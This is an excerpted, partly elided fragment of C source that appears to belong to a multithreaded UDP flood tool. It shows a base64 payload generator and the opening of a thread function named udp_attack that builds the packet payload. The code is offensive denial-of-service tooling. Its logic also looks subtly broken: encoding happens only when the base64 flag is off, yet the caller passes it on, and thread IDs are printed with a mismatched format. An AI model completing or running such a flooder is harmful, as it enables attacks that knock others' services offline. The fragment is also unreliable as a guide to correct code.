...
#define DEFAULT_PAYLOAD_SIZE 60
...
size_t base64_output_size(size_t input_size) {
    return ((input_size + 2) / 3) * 4 + 1; // Ceiling division + null terminator
}
...
void generate_payload(char *buffer, size_t size, unsigned int seed, int use_base64) {
    ...
    if (!use_base64) {
        ...
        // Generate raw data
        size_t raw_size = (size * 3) / 4; // Approximate size for base64 input
        char *temp = (char *)malloc(raw_size + 1);
        if (!temp) {
            fprintf(stderr, "[!] Thread %ld: Temp buffer allocation failed\n", pthread_self());
            return;
        }
        ...
        temp[raw_size] = '\0';
        base64_encode((unsigned char *)temp, buffer, raw_size);
        free(temp);
    }
}
...
void *udp_attack(void *arg) {
    ...
    size_t buffer_size = base64_output_size(config->payload_size);
    char *payload = (char *)malloc(buffer_size);
    if (!payload) {
        fprintf(stderr, "[!] Thread %ld: Payload allocation failed\n", pthread_self());
        close(sock);
        return NULL;
    }
    generate_payload(payload, config->payload_size, time(NULL) ^ pthread_self(), 1);
